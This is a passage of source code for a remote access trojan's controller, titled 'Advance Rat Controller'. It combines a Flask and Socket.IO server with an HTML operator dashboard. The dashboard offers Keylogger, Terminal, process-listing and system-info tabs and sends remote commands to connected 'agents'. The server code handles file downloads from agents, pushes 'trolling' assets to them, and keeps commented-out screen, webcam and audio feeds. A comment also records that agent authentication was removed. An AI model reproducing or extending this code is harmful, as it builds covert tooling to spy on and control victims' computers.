    color:var(--muted); padding:10px 12px; border-radius:8px; font-weight:600; font-size:0.9rem;
    cursor:pointer; transition:all .15s ease;
  }
  .nav-tab.active{
    color:white; background:linear-gradient(90deg, rgba(0,212,255,0.06), rgba(124,92,255,0.05));
    border:1px solid rgba(255,255,255,0.03);
    box-shadow:0 6px 20px rgba(7,22,50,0.5);
  }

  .top-actions{display:flex;align-items:center;gap:12px}
  .top-actions .btn{
    background:transparent;color:var(--muted);border:1px solid rgba(255,255,255,0.03);padding:8px 12px;border-radius:8px;font-weight:600;
  }
  .top-actions .logout{background:linear-gradient(90deg,var(--accent-a),var(--accent-b));padding:9px 14px;border-radius:8px}

  /* Page layout */
  .page{
    display:grid;
    grid-template-columns: 320px 1fr 360px;
    grid-template-rows: auto 1fr;
    gap:16px;
    height: calc(100vh - 68px);
    padding:18px;
  }

  /* Filters row spanning center+right */
  .filters{
    grid-column: 1 / span 3;
    display:flex;gap:12px;align-items:center;padding:12px;border-radius:12px;background:var(--glass-2);
    border:1px solid var(--card-border); margin-bottom:0;
  }
  .filters .filter{padding:10px 12px;border-radius:8px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.02);color:var(--muted);font-weight:600}
  .filters .filter.select{min-width:180px}
  .filters .spacer{flex:1}

  /* Left sidebar */
  .sidebar{
    background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
    border-radius:12px;padding:16px;border:1px solid var(--card-border);overflow:auto;
  }
  .sidebar h3{margin:0 0 12px 0;font-size:0.95rem;color:#fff}
  .agent-list{display:flex;flex-direction:column;gap:10px}
  .agent-item{
    display:flex;align-items:center;justify-content:space-between;padding:12px;border-radius:10px;background:rgba(255,255,255,0.01);
    border:1px solid rgba(255,255,255,0.02); cursor:pointer;
  }
  .agent-item .meta{display:flex;gap:10px;align-items:center}
  .agent-bullet{width:12px;height:12px;border-radius:50%}
  .bullet-online{background:#0ee6a6;box-shadow:0 0 8px rgba(14,230,166,0.12)}
  .bullet-off{background:#ff5c7c}
  .agent-name{font-weight:700;color:#eaf7ff}
  .agent-sub{font-size:0.8rem;color:var(--muted)}

  .controls{margin-top:14px;display:flex;flex-direction:column;gap:10px}
  .control-btn{padding:10px;border-radius:8px;background:transparent;border:1px solid rgba(255,255,255,0.03);color:var(--muted);font-weight:700;cursor:pointer}
  .control-btn.primary{background:linear-gradient(90deg,var(--accent-a),var(--accent-b));color:#02111a;border:none}

  /* Center area */
  .center{
    display:flex;flex-direction:column;gap:14px;padding:6px;overflow:hidden;
  }
  .card{
    border-radius:12px;padding:18px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
    border:1px solid var(--card-border);
  }

  .summary-row{display:grid;grid-template-columns: repeat(3,1fr);gap:14px}
  .summary-card{display:flex;gap:14px;align-items:center}
  .summary-card .chart-wrap{width:100px;height:100px;display:flex;align-items:center;justify-content:center}
  .summary-card .info{flex:1}
  .metric-big{font-size:1.45rem;font-weight:800;color:#fff}
  .metric-sub{color:var(--muted);font-size:0.85rem;margin-top:6px}

  .trend{
    margin-top:6px;height:320px;
  }

  /* Right column */
  .rightcol{display:flex;flex-direction:column;gap:14px;padding:0 6px;overflow:auto}
  .metric-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
  .metric-pill{padding:12px;border-radius:10px;background:rgba(255,255,255,0.01);border:1px solid var(--card-border);text-align:center}
  .metric-pill .v{font-weight:800;font-size:1.3rem;color:#fff}
  .terminal{height:260px;padding:12px;border-radius:10px;background:#071226;border:1px solid rgba(255,255,255,0.02);overflow:auto;font-family:monospace;color:#8ef0c5}

  /* System Overview sections */
  .system-overview{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:10px}
  .overview-section{padding:16px;border-radius:10px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.05)}
  .overview-section h4{margin:0 0 12px 0;color:#fff;font-size:1rem;font-weight:600}
  .info-display{display:flex;flex-direction:column;gap:8px}
  .info-item{display:flex;justify-content:space-between;align-items:center;padding:6px 0}
  .info-item .label{color:var(--muted);font-size:0.9rem}
  .info-item span:last-child{color:#fff;font-weight:500;text-align:right}

  /* Small helpers */
  .muted{color:var(--muted)}
  .small{font-size:0.85rem}
  .kpi{display:flex;gap:8px;align-items:center}
  .kpi .dot{width:10px;height:10px;border-radius:50%}
  .dot-blue{background:var(--accent-a)}
  .dot-purple{background:var(--accent-b)}

  /* responsive */
  @media (max-width:1100px){
    .page{grid-template-columns: 1fr; grid-auto-rows: auto; height:calc(100vh - 68px); overflow:auto}
    .filters{grid-column:1}
  }
</style>
</head>
<body>

  <div class="top-nav">
    <div class="brand">
      <div class="logo">N</div>
      <div style="display:flex;flex-direction:column;line-height:1">
        <h1>Advance Rat Controller</h1>
        <div class="muted small">Agent Live Monitoring</div>
      </div>

      <div class="nav-tabs" style="margin-left:22px">
        <div class="nav-tab active">Overview</div>
        <div class="nav-tab">List Process</div>
        <div class="nav-tab">System Info</div>
        <div class="nav-tab">Terminal</div>
        <div class="nav-tab">Keylogger</div>
        
      </div>
    </div>

    <div class="top-actions">
      <div class="small muted">Agent: <strong style="color:white">45t8ZVUro7QhXlClAAAB</strong></div>
      <a href="/logout" class="logout">Logout</a>
    </div>
  </div>

  <div class="page">

    <!-- FILTERS -->
    <div class="filters">
      <div class="filter select">Device Group: <strong style="margin-left:8px;color:white">Online</strong></div>
      <div class="filter select">Category: <strong style="margin-left:8px;color:white">Security</strong></div>
      <div class="filter">Checks: <strong style="margin-left:8px;color:white">Failed</strong></div>
      <div class="filter">Time Range: <strong style="margin-left:8px;color:white">current</strong></div>
      <div class="spacer"></div>
      <div class="filter small">Export</div>
      <div class="filter small">Refresh</div>
    </div>

    <!-- LEFT -->
    <div class="sidebar card">
      <h3>Active Agents</h3>
      <div class="agent-list" id="agent-list">
        <!-- JS will populate -->
        <div style="text-align:center;padding:26px;color:var(--muted);border-radius:10px;border:1px dashed rgba(255,255,255,0.02)">
          No agents connected
        </div>
      </div>

      <div class="controls">
        <button class="control-btn primary" onclick="getSystemInfo()">Agent Stats</button>
        <button class="control-btn" onclick="getNetworkInfo()">System Health</button>
        <button class="control-btn" onclick="listProcesses()">List Processes</button>
        <button class="control-btn" onclick="refreshOverview()">Refresh Dashboard</button>
      </div>
    </div>

    <!-- CENTER -->
    <div class="center">
      <!-- Summary row -->
      <div class="card summary-row">
        <div class="summary-card">
          <div class="chart-wrap">
            <canvas id="doughnut1" width="100" height="100"></canvas>
          </div>
          <div class="info">
            <div class="metric-big" id="metric1">23</div>
            <div class="metric-sub">Agent Reports</div>
          </div>
        </div>

        <div class="summary-card">
          <div class="chart-wrap">
            <canvas id="doughnut2" width="100" height="100"></canvas>
          </div>
          <div class="info">
            <div class="metric-big" id="metric2">8</div>
            <div class="metric-sub">Agents Status</div>
           
          </div>
        </div>

        <div class="summary-card">
          <div class="chart-wrap">
            <canvas id="doughnut3" width="100" height="100"></canvas>
          </div>
          <div class="info">
            <div class="metric-big" id="metric3">41%</div>
            <div class="metric-sub">Overall Pass Rate</div>
            <div class="small muted">Trend vs previous period</div>
          </div>
        </div>
      </div>

      <!-- Trend chart -->
      <div class="card">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
          <div style="font-weight:700">Controller Status</div>
          <div class="muted small">Last 30 days</div>
        </div>
        <div class="trend">
          <canvas id="trendChart" width="800" height="320"></canvas>
        </div>
      </div>

      <!-- System Overview with Dashboard Metrics -->
      <div style="display:flex;gap:12px">
        <div class="card" style="flex:1">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
            <div style="font-weight:700">System Overview</div>
            <div class="muted small">Real-time monitoring</div>
          </div>
          <div class="system-overview">
            <div class="overview-section">
              <h4>Agent Statistics</h4>
              <div id="agent-stats-display" class="info-display">
                <div class="info-item"><span class="label">Agent Reports:</span> <span id="agent-reports">0</span></div>
                <div class="info-item"><span class="label">Agents Status:</span> <span id="agents-status">26</span></div>
                <div class="info-item"><span class="label">Overall Pass Rate:</span> <span id="pass-rate">57%</span></div>
                <div class="info-item"><span class="label">Trend:</span> <span id="trend-info">vs previous period</span></div>
              </div>
            </div>
            <div class="overview-section">
              <h4>System Health</h4>
              <div id="system-health-display" class="info-display">
                <div class="info-item"><span class="label">Controller Status:</span> <span id="controller-status">Active</span></div>
                <div class="info-item"><span class="label">Monitoring Period:</span> <span id="monitoring-period">Last 30 days</span></div>
                <div class="info-item"><span class="label">System Uptime:</span> <span id="system-uptime">Loading...</span></div>
                <div class="info-item"><span class="label">Last Update:</span> <span id="last-update">Just now</span></div>
              </div>
            </div>
          </div>
        </div>

        <div class="card" style="width:340px">
          <div style="display:flex;justify-content:space-between;align-items:center">
            <div style="font-weight:700">Quick Metrics</div>
            <div class="muted small">Real-time</div>
          </div>

          <div class="metric-grid" style="margin-top:12px">
            <div class="metric-pill"><div class="v" id="m1">12</div><div class="small muted">Active Agents</div></div>
            <div class="metric-pill"><div class="v" id="m2">5</div><div class="small muted">Online Systems</div></div>
            <div class="metric-pill"><div class="v" id="m3">98%</div><div class="small muted">System Health</div></div>
            <div class="metric-pill"><div class="v" id="m4">45ms</div><div class="small muted">Response Time</div></div>
          </div>

          <div style="margin-top:12px;font-weight:700">Output</div>
          <div class="terminal" id="output-terminal">NEURAL_TERMINAL_v2.1 &gt; Waiting for events...</div>
        </div>
      </div>
    </div>

    <!-- RIGHT -->
    <div class="rightcol">
      <div class="card">
        <div style="display:flex;justify-content:space-between;align-items:center">
          <div style="font-weight:700">Config Status</div>
          <div class="muted small">Last updated: <span id="cfg-time">—</span></div>
        </div>
        <div style="margin-top:12px;display:grid;gap:8px">
          <div style="display:flex;justify-content:space-between"><div class="muted">Admin password set</div><div id="cfg1">Yes</div></div>
          <div style="display:flex;justify-content:space-between"><div class="muted">Secret key</div><div id="cfg2">Hidden</div></div>
          <div style="display:flex;justify-content:space-between"><div class="muted">Session timeout</div><div id="cfg3">3600s</div></div>
          <div style="display:flex;justify-content:space-between"><div class="muted">Blocked IPs</div><div id="cfg4">0</div></div>
        </div>
      </div>

      <div class="card">
        <div style="font-weight:700;margin-bottom:8px">Password Management</div>
        <div style="display:flex;flex-direction:column;gap:8px">
          <input id="new-pass" placeholder="New password" style="padding:10px;border-radius:8px;background:transparent;border:1px solid rgba(255,255,255,0.03);color:#fff">
          <button class="control-btn primary" onclick="changePassword()">Change Password</button>
          <div class="small muted">Make sure you are connected via secure channel.</div>
        </div>
      </div>
    </div>

  </div>

<script>
  /* --------- Socket.IO hook (existing server) --------- */
  const socket = io();

  // Example socket events wiring - adapt to your server event names
  socket.on('connect', ()=> {
    appendLog('Socket connected: ' + socket.id);
    updateMetric('m1', '---');
  });

  socket.on('agent_list', data => {
    renderAgentList(data);
  });

  socket.on('terminal_output', data => {
    appendLog(data);
  });

  socket.on('config_status', data => {
    document.getElementById('cfg-time').innerText = new Date().toLocaleTimeString();
    document.getElementById('cfg1').innerText = data.admin_password_set ? 'Yes':'No';
    document.getElementById('cfg3').innerText = data.session_timeout + 's';
    document.getElementById('cfg4').innerText = data.blocked_ips.length;
  });

  /* --------- Render helpers --------- */
  function appendLog(msg){
    const el = document.getElementById('output-terminal');
    el.innerText = (new Date().toLocaleTimeString()) + ' > ' + msg + '\\n' + el.innerText;
  }
  function renderAgentList(list){
    const container = document.getElementById('agent-list');
    container.innerHTML = '';
    if(!list || list.length===0){
      container.innerHTML = '<div style="text-align:center;padding:26px;color:var(--muted);border-radius:10px;border:1px dashed rgba(255,255,255,0.02)">No agents connected</div>';
      return;
    }
    list.forEach(a=>{
      const item = document.createElement('div');
      item.className='agent-item';
      item.innerHTML = `<div class="meta"><div style="display:flex;flex-direction:column"><div class="agent-name">${a.name || a.id}</div><div class="agent-sub">${a.os||'unknown'}</div></div></div><div style="display:flex;align-items:center;gap:8px"><div class="agent-bullet ${a.online?'bullet-online':'bullet-off'}"></div><div class="muted small">${a.id}</div></div>`;
      item.onclick = ()=>{ selectAgent(a.id); };
      container.appendChild(item);
    });
  }
  function selectAgent(id){ document.getElementById('agent-id')?.setAttribute('value', id); appendLog('Selected agent '+id); }

  /* --------- Chart.js: doughnuts + trend --------- */
  const doughnutOpts = {responsive:true, maintainAspectRatio:false, cutout:'70%', plugins:{legend:{display:false}}};

  const d1 = new Chart(document.getElementById('doughnut1').getContext('2d'),{
    type:'doughnut',
    data:{labels:['error','problems','bugs'], datasets:[{data:[60,30,10], backgroundColor:[getColor('--accent-a'), getColor('--accent-b'),'rgba(255,255,255,0.06)'], borderWidth:0}]},
    options:doughnutOpts
  });
  const d2 = new Chart(document.getElementById('doughnut2').getContext('2d'),{
    type:'doughnut',
    data:{labels:['Online','Recently','Offline'], datasets:[{data:[40,30,30], backgroundColor:[getColor('--accent-b'),getColor('--accent-a'),'rgba(255,255,255,0.06)'], borderWidth:0}]},
    options:doughnutOpts
  });
  const d3 = new Chart(document.getElementById('doughnut3').getContext('2d'),{
    type:'doughnut',
    data:{labels:['Pass','Fail'], datasets:[{data:[59,41], backgroundColor:['rgba(0,255,190,0.12)','rgba(255,92,124,0.12)'], borderWidth:0}]},
    options:doughnutOpts
  });

  const trendCtx = document.getElementById('trendChart').getContext('2d');
  const trendChart = new Chart(trendCtx, {
    type: 'line',
    data: {
      labels: Array.from({length:30}, (_,i)=>'Day '+(i+1)),
      datasets: [
        {label:'latency', data: randomSeries(30,40,85), borderColor:getColor('--accent-a'), tension:0.28, pointRadius:2, fill:false},
        {label:'Overall Agents', data: randomSeries(30,20,70), borderColor:getColor('--accent-b'), tension:0.28, pointRadius:2, fill:false},
        {label:'Network', data: randomSeries(30,10,60), borderColor:'#9be8ff', tension:0.28, pointRadius:2, fill:false},
        {label:'Service', data: randomSeries(30,5,55), borderColor:'#7ee3b6', tension:0.28, pointRadius:2, fill:false}
      ]
    },
    options:{
      responsive:true, maintainAspectRatio:false,
      plugins:{legend:{labels:{color:'#cfeaff'}}},
      scales:{
        x:{grid:{display:false}, ticks:{color:'#9fb8d8'}},
        y:{grid:{color:'rgba(255,255,255,0.03)'}, ticks:{color:'#9fb8d8'}}
      }
    }
  });

  function randomSeries(n,min,max){ return Array.from({length:n}, ()=> Math.round(Math.random()*(max-min)+min)); }
  function getColor(varName){
    // read value from CSS variable
    return getComputedStyle(document.documentElement).getPropertyValue(varName) || '#00d4ff';
  }

  /* --------- helpers for updating DOM metrics --------- */
  function updateMetric(id,val){ const el=document.getElementById(id); if(el) el.innerText=val; }
  function appendToEl(id,txt){ const e=document.getElementById(id); if(e) e.innerText += '\\n'+txt; }

  /* --------- Overview and dashboard functions --------- */
  function issueCommand(){ const cmd = document.getElementById('command')?.value || ''; if(cmd) { socket.emit('issue_command', {command:cmd}); appendLog('Issued command: '+cmd);} }
  function listProcesses(){ socket.emit('list_processes'); appendLog('Requested process list'); }
  function getSystemInfo(){ socket.emit('get_agent_stats'); appendLog('Requested agent statistics'); }
  function getNetworkInfo(){ socket.emit('get_system_health'); appendLog('Requested system health'); }
  function refreshOverview(){ socket.emit('refresh_dashboard'); appendLog('Refreshing dashboard data'); }
  
  // Handle agent stats response
  socket.on('agent_stats_response', function(data) {
    if(data.reports) document.getElementById('agent-reports').textContent = data.reports;
    if(data.status) document.getElementById('agents-status').textContent = data.status;
    if(data.pass_rate) document.getElementById('pass-rate').textContent = data.pass_rate;
    if(data.trend) document.getElementById('trend-info').textContent = data.trend;
    appendLog('Agent statistics updated');
  });
  
  // Handle system health response
  socket.on('system_health_response', function(data) {
    if(data.controller_status) document.getElementById('controller-status').textContent = data.controller_status;
    if(data.monitoring_period) document.getElementById('monitoring-period').textContent = data.monitoring_period;
    if(data.uptime) document.getElementById('system-uptime').textContent = data.uptime;
    if(data.last_update) document.getElementById('last-update').textContent = data.last_update;
    appendLog('System health updated');
  });
  
  // Auto-refresh dashboard metrics every 30 seconds
  setInterval(() => {
    refreshOverview();
  }, 30000);
  function changePassword(){
    const p = document.getElementById('new-pass').value;
    if(!p || p.length<8){ alert('Choose password >= 8 chars'); return; }
    fetch('/change-password',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({current_password:'', new_password:p})})
      .then(r=>r.json()).then(j=>{ if(j.success) alert('Password changed'); else alert('Error: '+j.message) }).catch(e=>alert('Error'));
  }

  /* demo: update metrics every 7s */
  setInterval(()=>{ updateMetric('metric1', Math.floor(Math.random()*60)); updateMetric('metric2', Math.floor(Math.random()*40)); updateMetric('metric3', Math.floor(Math.random()*100)+'%'); updateMetric('m1', Math.floor(Math.random()*20)); },7000);

  /* demo: append a start line */
  appendLog('Dashboard ready — waiting for agents');

</script>
</body>
</html>
'''


# In-memory storage for agent data
AGENTS_DATA = defaultdict(lambda: {"sid": None, "last_seen": None})
DOWNLOAD_BUFFERS = defaultdict(lambda: {"chunks": [], "total_size": 0, "local_path": None})
FILE_INFO_WAITERS = {}

def _agents_payload():
    try:
        return {aid: dict(data) for aid, data in AGENTS_DATA.items()}
    except Exception:
        return {}
FILE_RANGE_WAITERS = {}
FILE_THUMB_WAITERS = {}
FILE_FASTSTART_WAITERS = {}
FILE_WAITERS_LOCK = threading.Lock()
FASTSTART_CACHE = {}
FASTSTART_CACHE_LOCK = threading.Lock()
FASTSTART_CACHE_TTL_S = 15 * 60
STREAM_SETTINGS = defaultdict(lambda: {"chunk_size": 1024 * 1024})
FEATURE_FLAGS_DEFAULT = {
    "monitoring_enabled": True,
    "frame_dropping_enabled": False,
    "adaptive_bitrate_enabled": True,
    "last_updated": None,
}
AGENT_FEATURE_FLAGS = defaultdict(lambda: dict(FEATURE_FLAGS_DEFAULT))

MIN_STREAM_CHUNK = 256 * 1024
MAX_STREAM_CHUNK = 8 * 1024 * 1024
FILE_METADATA_CACHE = {}
FILE_METADATA_CACHE_LOCK = threading.Lock()
CACHE_TTL = 300

def get_cached_metadata(agent_id: str, file_path: str):
    key = f"{agent_id}:{file_path}"
    with FILE_METADATA_CACHE_LOCK:
        entry = FILE_METADATA_CACHE.get(key)
        if entry and (time.time() - entry['timestamp']) < CACHE_TTL:
            return entry['data']
    return None

def set_cached_metadata(agent_id: str, file_path: str, data: dict):
    key = f"{agent_id}:{file_path}"
    with FILE_METADATA_CACHE_LOCK:
        FILE_METADATA_CACHE[key] = {
            'data': data,
            'timestamp': time.time()
        }

# Controller-hosted trolling assets (operator uploads -> agent fetch via signed URL)
TROLL_UPLOADS = {}
TROLL_ASSETS = {}

def _get_stream_chunk_size(agent_id: str) -> int:
    try:
        s = STREAM_SETTINGS.get(agent_id) or {}
        cs = int(s.get("chunk_size") or (1024 * 1024))
        return max(MIN_STREAM_CHUNK, min(cs, MAX_STREAM_CHUNK))
    except Exception:
        return 1024 * 1024

def _adjust_stream_chunk_size(agent_id: str, elapsed_s: float, success: bool):
    try:
        current = _get_stream_chunk_size(agent_id)
        if not success:
            new_size = max(MIN_STREAM_CHUNK, current // 2)
        else:
            if elapsed_s < 1.0:
                new_size = min(MAX_STREAM_CHUNK, current * 2)
            elif elapsed_s > 10.0:
                new_size = max(MIN_STREAM_CHUNK, current // 2)
            else:
                new_size = current
        STREAM_SETTINGS[agent_id] = {"chunk_size": new_size}
    except Exception:
        pass

def _faststart_cache_get(agent_id: str, file_path: str):
    try:
        key = f"{agent_id}:{file_path}"
        now = time.time()
        with FASTSTART_CACHE_LOCK:
            entry = FASTSTART_CACHE.get(key)
            if not entry:
                return None
            if (now - float(entry.get('ts') or 0)) > FASTSTART_CACHE_TTL_S:
                FASTSTART_CACHE.pop(key, None)
                return None
            return entry
    except Exception:
        return None

def _faststart_cache_set(agent_id: str, file_path: str, transformed_path: str | None, ok: bool):
    try:
        key = f"{agent_id}:{file_path}"
        with FASTSTART_CACHE_LOCK:
            FASTSTART_CACHE[key] = {
                'path': transformed_path,
                'ok': bool(ok),
                'ts': time.time(),
            }
    except Exception:
        pass

# Remove the agent secret authentication - allow direct agent access
# AGENT_SHARED_SECRET = os.environ.get("AGENT_SHARED_SECRET", "sphinx_agent_secret")

# def require_agent_secret(f):
#     def decorated(*args, **kwargs):
#         if request.headers.get("X-AGENT-SECRET") != AGENT_SHARED_SECRET:
#             return "Forbidden", 403
#         return f(*args, **kwargs)
#     decorated.__name__ = f.__name__
#     return decorated

# --- Operator-facing endpoints ---

@app.route("/")
def index():
    if is_authenticated():
        # Serve a single unified dashboard to avoid confusion between two UIs
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route("/dashboard")
@require_auth
def dashboard():
    try:
        base_dir = os.path.dirname(__file__)
        candidate_builds = [
            os.path.join(base_dir, 'agent-controller ui v2.1', 'build'),
        ]
        index_path = None
        for b in candidate_builds:
            p = os.path.join(b, 'index.html')
            if os.path.exists(p):
                index_path = p
                break
        if index_path:
            with open(index_path, 'r', encoding='utf-8', errors='replace') as f:
                index_html = f.read()
            runtime_overrides = (
                "<script>"
                "window.__SOCKET_URL__ = window.location.protocol + '//' + window.location.host;"
                "window.__API_URL__ = window.__SOCKET_URL__;"
                "</script>"
            )
            if "</head>" in index_html:
                modified = index_html.replace("</head>", runtime_overrides + "</head>")
            else:
                # Fallback: prepend overrides at top
                modified = runtime_overrides + index_html
            return Response(modified, mimetype='text/html')
        else:
            # If index.html isn't found, try direct asset inlining as a secondary strategy
            def find_asset(glob_pattern_candidates):
                for assets_dir, pattern in glob_pattern_candidates:
                    try:
                        if os.path.isdir(assets_dir):
                            for fname in sorted(os.listdir(assets_dir)):
                                if fname.startswith(pattern[0]) and fname.endswith(pattern[1]):
                                    return os.path.join(assets_dir, fname)
                    except Exception:
                        continue
                return None
            assets_dirs = [
                os.path.join(base_dir, 'agent-controller ui v2.1', 'build', 'assets'),
            ]
            css_path = find_asset([(d, ('index-', '.css')) for d in assets_dirs])
            js_path = find_asset([(d, ('index-', '.js')) for d in assets_dirs])
            if not css_path or not js_path:
                raise FileNotFoundError('Built assets not found in assets directories')
            with open(css_path, 'r', encoding='utf-8', errors='replace') as f:
                css_inline = f.read()
            with open(js_path, 'r', encoding='utf-8', errors='replace') as f:
                js_bundle = f.read()
            runtime_overrides = """
            <script>
            window.__SOCKET_URL__ = window.location.protocol + '//' + window.location.host;
            window.__API_URL__ = window.__SOCKET_URL__;
            </script>
            """
            html = f"""
            <!DOCTYPE html>
            <html lang=\"en\">
              <head>
                <meta charset=\"UTF-8\" />
                <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />
                <title>Agent Controller</title>
                <style>{css_inline}</style>
                {runtime_overrides}
              </head>
              <body>
                <div id=\"root\"></div>
                <script type=\"module\">{js_bundle}</script>
              </body>
            </html>
            """
            return Response(html, mimetype='text/html')
    except Exception as e:
        print(f"Failed to inline dashboard, falling back to static file: {e}")
        # Fallback to static file if inline fails
        build_path = os.path.join(os.path.dirname(__file__), 'agent-controller ui v2.1', 'build', 'index.html')
        return send_file(build_path)

# Serve static assets for the UI v2.1
@app.route('/assets/<path:filename>')
def serve_assets(filename):
    base_dir = os.path.dirname(__file__)
    candidates = [
        os.path.join(base_dir, 'agent-controller ui v2.1', 'build', 'assets'),
    ]
    for assets_dir in candidates:
        candidate_path = os.path.join(assets_dir, filename)
        if os.path.isfile(candidate_path):
            try:
                with open(candidate_path, 'rb') as f:
                    data = f.read()
                mime = 'text/css' if filename.endswith('.css') else 'application/javascript'
                return Response(data, mimetype=mime)
            except Exception:
                continue
    return ("Asset not found", 404)

@app.route('/debug-assets')
@require_auth
def debug_assets():
    base_dir = os.path.dirname(__file__)
    dirs = [
        os.path.join(base_dir, 'agent-controller ui v2.1', 'build'),
        os.path.join(base_dir, 'agent-controller ui v2.1', 'build', 'assets'),
        os.path.join(base_dir, 'agent-controller ui', 'build'),
        os.path.join(base_dir, 'agent-controller ui', 'build', 'assets'),
    ]
    out = []
    for d in dirs:
        exists = os.path.isdir(d)
        files = []
        if exists:
            try:
                for fname in os.listdir(d):
                    fp = os.path.join(d, fname)
                    try:
                        size = os.path.getsize(fp)
                    except Exception:
                        size = None
                    files.append({'name': fname, 'size': size})
            except Exception:
                pass
        out.append({'dir': d, 'exists': exists, 'files': files})
    return jsonify(out)
# --- Real-time Streaming Endpoints (COMMENTED OUT - REPLACED WITH OVERVIEW) ---
# 
# STREAMING OPTIMIZATION FOR REAL-TIME MONITORING:
# - Frame interval: 0.5 seconds (2 FPS)
# - Optimized for real-time monitoring with 0.5-second picture updates
# - Reduced latency and improved responsiveness
# - Better performance for monitoring applications
#

# VIDEO_FRAMES = defaultdict(lambda: None)
# CAMERA_FRAMES = defaultdict(lambda: None)
# AUDIO_CHUNKS = defaultdict(lambda: queue.Queue())

# Frame timing for real-time monitoring
# FRAME_INTERVAL = 0.5  # 0.5-second intervals for 2 FPS

# HTTP streaming endpoints for browser compatibility (COMMENTED OUT)
# @app.route('/video_feed/<agent_id>')
# @require_auth
# def video_feed(agent_id):
#     """Stream video feed for a specific agent"""
#     def generate_video():
#         while True:
#             if agent_id in VIDEO_FRAMES_H264 and VIDEO_FRAMES_H264[agent_id]:
#                 frame = VIDEO_FRAMES_H264[agent_id]
#                 yield (b'--frame\r\n'
#                        b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
#             else:
#                 # Generate a demo frame with agent ID for testing
#                 import io
#                 from PIL import Image, ImageDraw, ImageFont
#                 
#                 # Create a demo image
#                 img = Image.new('RGB', (640, 480), color='#1e40af')
#                 draw = ImageDraw.Draw(img)
#                 
#                 # Try to use a font, fallback to default if not available
#                 try:
#                     font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 36)
#                 except:
#                     font = ImageFont.load_default()
#                 
#                 # Draw demo text
#                 draw.text((320, 200), f"Agent {agent_id}", fill='white', anchor='mm', font=font)
#                 draw.text((320, 250), "Screen Stream", fill='white', anchor='mm', font=font)
#                 draw.text((320, 300), "Demo Mode", fill='white', anchor='mm', font=font)
#                 
#                 # Convert to JPEG
#                 img_io = io.BytesIO()
#                 img.save(img_io, 'JPEG', quality=85)
#                 img_io.seek(0)
#                 demo_frame = img_io.getvalue()
#                 
#                 yield (b'--frame\r\n'
#                        b'Content-Type: image/jpeg\r\n\r\n' + demo_frame + b'\r\n')
#             time.sleep(0.5)  # 2 FPS
#     
#     return Response(generate_video(),
#                     mimetype='multipart/x-mixed-replace; boundary=frame',
#                     headers={'Cache-Control': 'no-cache, no-store, must-revalidate',
#                             'Pragma': 'no-cache',
#                             'Expires': '0'})

# @app.route('/camera_feed/<agent_id>')
# @require_auth
# def camera_feed(agent_id):
#     """Stream camera feed for a specific agent"""
#     def generate_camera():
#         while True:
#             if agent_id in CAMERA_FRAMES_H264 and CAMERA_FRAMES_H264[agent_id]:
#                 frame = CAMERA_FRAMES_H264[agent_id]
#                 yield (b'--frame\r\n'
#                        b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
#             else:
#                 # Generate a demo frame with agent ID for testing
#                 import io
#                 from PIL import Image, ImageDraw, ImageFont
#                 
#                 # Create a demo image
#                 img = Image.new('RGB', (640, 480), color='#059669')
#                 draw = ImageDraw.Draw(img)
#                 
#                 # Try to use a font, fallback to default if not available
#                 try:
#                     font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 36)
#                 except:
#                     font = ImageFont.load_default()
#                 
#                 # Draw demo text
#                 draw.text((320, 200), f"Agent {agent_id}", fill='white', anchor='mm', font=font)
#                 draw.text((320, 250), "Camera Stream", fill='white', anchor='mm', font=font)
#                 draw.text((320, 300), "Demo Mode", fill='white', anchor='mm', font=font)
#                 
#                 # Convert to JPEG
#                 img_io = io.BytesIO()
#                 img.save(img_io, 'JPEG', quality=85)
#                 img_io.seek(0)
#                 demo_frame = img_io.getvalue()
#                 
#                 yield (b'--frame\r\n'
#                        b'Content-Type: image/jpeg\r\n\r\n' + demo_frame + b'\r\n')
#             time.sleep(0.5)  # 2 FPS
#     
#     return Response(generate_camera(),
#                     mimetype='multipart/x-mixed-replace; boundary=frame',
#                     headers={'Cache-Control': 'no-cache, no-store, must-revalidate',
#                             'Pragma': 'no-cache',
#                             'Expires': '0'})

# @app.route('/audio_feed/<agent_id>')
# @require_auth
# def audio_feed(agent_id):
#     """Stream audio feed for a specific agent"""
#     def generate_audio():
#         while True:
#             if agent_id in AUDIO_FRAMES_OPUS and AUDIO_FRAMES_OPUS[agent_id]:
#                 frame = AUDIO_FRAMES_OPUS[agent_id]
#                 yield frame
#             else:
#                 # Send silence if no data available
#                 yield b'\x00' * 1024
#             time.sleep(0.1)  # 10 FPS for audio
#     
#     return Response(generate_audio(),
#                     mimetype='audio/wav',
#                     headers={'Cache-Control': 'no-cache, no-store, must-revalidate',
#                             'Pragma': 'no-cache',
#                             'Expires': '0'})

# --- NEW API ENDPOINTS FOR MODERN UI ---

# Authentication API for frontend
@app.route('/api/auth/login', methods=['POST'])
def api_login():
    """API endpoint for frontend authentication"""
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    
    password = request.json.get('password')
    otp_raw = request.json.get('otp')
    otp = re.sub(r'\D', '', str(otp_raw or ''))[:6]
    if not password:
        return jsonify({'error': 'Password is required'}), 400
    
    client_ip = get_client_ip()
    if is_ip_blocked(client_ip):
        try:
            email_cfg = load_settings().get('email', {})
            if email_cfg.get('enabled') and email_cfg.get('notifySecurityAlert'):
                send_email_notification(
                    "Security Alert: Login Blocked",
                    f"Login attempt blocked for IP {client_ip} due to too many failed attempts."
                )
        except Exception:
            pass
        return jsonify({'error': 'Too many failed attempts. Try again later.'}), 429
    
    if verify_admin_or_operator(password):
        cfg = load_settings().get('authentication', {})
        require_two_factor = False
        trusted_ok = False
        try:
            token = request.cookies.get('trusted_device')
            if token:
